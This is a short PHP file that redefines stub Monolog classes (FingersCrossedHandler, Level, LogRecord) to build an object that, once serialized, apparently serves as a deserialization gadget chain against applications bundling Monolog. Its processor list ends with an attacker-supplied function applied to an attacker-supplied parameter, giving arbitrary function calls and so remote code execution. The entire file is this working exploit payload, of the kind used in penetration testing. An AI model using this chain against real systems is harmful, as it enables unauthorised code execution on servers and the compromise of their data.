<?php

namespace Monolog\Handler
{
    class FingersCrossedHandler
    {
        protected $passthruLevel = \Monolog\Level::Debug;
        protected $handler;
        protected $buffer;
        protected $processors;
        
        function __construct($function, $parameter)
        {
            $this->processors = ['get_object_vars', 'end', $function];
            $this->buffer = [new \Monolog\LogRecord($parameter)];
            $this->handler = $this;
        }
    }
}

namespace Monolog
{
    enum Level: int
    {
        case Debug = 100;
    }

    class LogRecord
    {
        public Level $level = \Monolog\Level::Debug;
        public mixed $formatted;
        
        function __construct($parameter)
        {
            $this->mixed = $parameter;
        }
    }
}